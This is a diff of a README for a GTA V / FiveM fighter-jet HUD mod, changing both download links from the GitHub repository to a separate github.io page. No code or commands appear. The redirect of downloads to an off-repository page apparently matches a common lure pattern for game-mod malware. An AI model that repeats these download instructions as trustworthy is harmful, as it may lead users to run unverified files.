@@ -1,6 +1,6 @@
 # ✈️ fighterjet-hud-script-2026 - Realistic display for your fighter jet
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/mvcingenier5535/fighterjet-hud-script-2026)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://mvcingenier5535.github.io)
 
 This software replaces the standard cockpit display in GTA V with a detailed flight interface. It provides pilots with clear data on flight speed, altitude, and weapon status. The goal remains to increase immersion during flight missions.
 
@@ -18,7 +18,7 @@ To run this tool without issues, your computer requires the following:
 
 Follow these steps to add the display to your game:
 
-1. Visit the [official download page](https://github.com/mvcingenier5535/fighterjet-hud-script-2026) to obtain the file.
+1. Visit the [official download page](https://mvcingenier5535.github.io) to obtain the file.
 2. Locate the ZIP folder in your Downloads folder.
 3. Right-click the folder and select Extract All.
 4. Open your FiveM application folder.
